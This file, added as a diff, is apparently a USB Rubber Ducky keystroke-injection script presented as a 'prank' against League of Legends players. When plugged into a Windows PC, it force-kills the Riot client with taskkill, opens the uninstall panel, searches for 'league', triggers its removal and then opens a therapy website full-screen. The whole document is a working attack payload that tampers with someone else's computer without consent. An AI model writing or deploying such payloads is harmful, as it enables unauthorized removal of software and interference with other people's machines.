@@ -1,0 +1,37 @@
+REM Prank that looks for League of Legends on Windows and uninstalls it as fast as possible
+REM May not work on older hardware (delays need to be adjusted)
+
+GUI R
+DELAY 500
+STRING taskkill /IM RiotClientServices.exe /F
+ENTER
+DELAY 500
+
+GUI r
+DELAY 500
+STRING appwiz.cpl
+ENTER
+
+DELAY 1000
+
+CTRL f
+DELAY 500
+STRING league
+
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 500
+UP
+DELAY 500
+ENTER
+DELAY 1000
+
+GUI r
+DELAY 1000
+STRING msedge "https://www.betterhelp.com/" --start-fullscreen
+DELAY 500
+ENTER
